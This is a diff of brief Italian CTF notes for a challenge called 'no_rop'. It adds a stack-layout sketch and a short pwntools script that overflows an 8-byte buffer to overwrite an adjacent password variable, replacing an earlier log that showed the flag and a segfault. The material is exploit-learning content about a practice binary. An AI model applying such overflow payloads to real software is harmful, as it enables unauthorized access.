@@ -1,9 +1,20 @@
 1)no_rop
-  Enter the password : 
-  123456789123456789123456789
-  Correct password! 
-  Flag={hello_world_pwn}
-  Errore di segmentazione (core dump creato)
+  STACK:
+  	Area libera
+  	buffer[8]
+  	pass (4Bytes)
+  	ptr alla base
+  	ind. di ritorno
+	
+  Se vogliamo sovrascrivere pass basta mandare 8 caratteri casuali (garbage) + un valore che sovrascriva pass.
+  	from pwn import *
+  	p=process('./no_rop')
+  	garbage='A'*8
+  	over='1'
+  	payload=garbage+over
+  	p.sendline(payload)
+  	print(p.recvall())
+
 
 2)pwn0
   Script.py
